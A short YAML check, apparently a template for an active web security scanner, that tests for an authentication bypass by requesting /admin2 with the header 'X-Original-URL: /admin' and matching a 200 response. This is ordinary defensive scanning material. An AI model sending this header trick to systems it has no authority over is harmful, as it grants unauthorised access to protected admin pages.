id: bypass-001
name: 'Header bypass X-Original-URL'
severity: high
type: active
tags:
  - bypass
  - auth
  - headers
description: 'Reaches /admin2 via X-Original-URL'
requests:
  - method: GET
    path: '{{BaseURL}}/admin2'
    sendHeaders:
      X-Original-URL: '/admin'
    matchers:
      - type: status
        status: [200]
